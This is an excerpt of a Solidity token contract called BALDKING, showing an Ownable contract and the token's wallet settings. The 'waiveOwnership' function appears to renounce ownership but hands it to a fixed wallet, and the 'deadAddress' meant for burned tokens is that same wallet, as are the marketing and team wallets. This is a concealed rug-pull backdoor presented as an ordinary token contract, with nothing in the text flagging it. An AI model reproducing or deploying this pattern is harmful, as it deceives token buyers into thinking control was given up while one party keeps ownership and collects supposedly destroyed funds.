...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x3698180176682Fe644655c74657854c9A9d7Da70));
        _owner = address(0x3698180176682Fe644655c74657854c9A9d7Da70);
    }
...
contract BALDKING is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "BALDKING";
    string private _symbol = "BALDKING";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x3698180176682Fe644655c74657854c9A9d7Da70);
    address payable public teamWalletAddress = payable(0x3698180176682Fe644655c74657854c9A9d7Da70);
    address public immutable deadAddress = 0x3698180176682Fe644655c74657854c9A9d7Da70;
